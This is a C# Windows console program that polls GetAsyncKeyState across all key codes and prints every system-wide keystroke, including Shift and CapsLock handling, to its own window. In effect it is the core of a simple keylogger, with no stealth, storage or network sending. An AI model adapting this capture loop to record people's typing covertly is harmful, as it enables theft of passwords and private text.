using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("User32.dll")]
        public static extern int GetKeyState(int i);

        static void Main(string[] args)
        {
            bool shiftIsPressed = false;

            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 32769)
                    {
                        if (GetKeyState(0x10) != 65408 && GetKeyState(0x10) != 65409)
                            shiftIsPressed = false;

                        if (GetKeyState(0x10) == 65408 || GetKeyState(0x10) == 65409)
                        {
                            switch (i)
                            {
                                case 8:
                                case 9:
                                case 13:
                                case 16:                 //extra for Shift
                                case 17:                 //extra for Ctrl
                                case 18:                 //extra for Alt
                                case 20:
                                case 22:
                                case 27:
                                case 32:
                                case 37:
                                case 38:
                                case 39:
                                case 40: continue;
                                case 48: Console.Write(") "); break;
                                case 49: Console.Write("! "); break;
                                case 50: Console.Write("@ "); break;
                                case 51: Console.Write("# "); break;
                                case 52: Console.Write("$ "); break;
                                case 53: Console.Write("% "); break;
                                case 54: Console.Write("^ "); break;
                                case 55: Console.Write("& "); break;
                                case 56: Console.Write("* "); break;
                                case 57: Console.Write("( "); break;
                                case 91: continue;
                                case 160:
                                    if (!shiftIsPressed)
                                    {
                                        Console.Write("leftShift ");
                                        shiftIsPressed = true;
                                    }
                                    break;
                                case 161:
                                    if (!shiftIsPressed)
                                    {
                                        Console.Write("rightShift ");
                                        shiftIsPressed = true;
                                    }
                                    break;
                                case 162:
                                case 163:
                                case 164:
                                case 165: continue;
                                case 186: Console.Write(": "); break;
                                case 187: Console.Write("+ "); break;
                                case 188: Console.Write("< "); break;
                                case 189: Console.Write("_ "); break;
                                case 190: Console.Write("> "); break;
                                case 191: Console.Write("? "); break;
                                case 192: Console.Write("~ "); break;
                                case 219: Console.Write("{ "); break;
                                case 220: Console.Write("| "); break;
                                case 221: Console.Write("} "); break;
                                case 222: Console.Write("\" "); break;
                                default: Console.Write((char)i + " "); break;
                            }
                        }
                        else
                        {
                            switch (i)
                            {
                                case 8: Console.Write("Backspace "); break;
                                case 9: Console.Write("Tab "); break;
                                case 13: Console.Write("Enter "); break;
                                case 16:                 //extra for Shift
                                case 17:                 //extra for Ctrl
                                case 18: continue;       //extra for Alt
                                case 20: Console.Write("CapsLock "); break;
                                case 22: Console.Write("' "); break;
                                case 27: Console.Write("Escape "); break;
                                case 32: Console.Write("Space "); break;
                                case 37: Console.Write("pgLeft "); break;
                                case 38: Console.Write("pgUp "); break;
                                case 39: Console.Write("pgRight "); break;
                                case 40: Console.Write("pgDown "); break;
                                case 91: Console.Write("Win "); break;
                                case 162: Console.Write("leftCtrl "); break;
                                case 163: Console.Write("rightCtrl "); break;
                                case 164: Console.Write("leftAlt "); break;
                                case 165: Console.Write("rightAlt "); break;
                                case 186: Console.Write("; "); break;
                                case 187: Console.Write("= "); break;
                                case 188: Console.Write(", "); break;
                                case 189: Console.Write("- "); break;
                                case 190: Console.Write(". "); break;
                                case 191: Console.Write("/ "); break;
                                case 192: Console.Write("` "); break;
                                case 219: Console.Write("[ "); break;
                                case 220: Console.Write(@"\ "); break;
                                case 221: Console.Write("] "); break;
                                case 222: Console.Write("' "); break;
                                default:
                                    if (Console.CapsLock)
                                    {
                                        Console.Write((char)i + " ");
                                    }
                                    else
                                    {
                                        Console.Write(toLower((char)i) + " ");
                                    }
                                    break;
                            }
                        }
                    }
                }
            }
        }

        static char toLower(char str)
        {
            if (str >= 65 && str <= 90)
                str = (char)(str + 32);
            return str;
        }
    }
}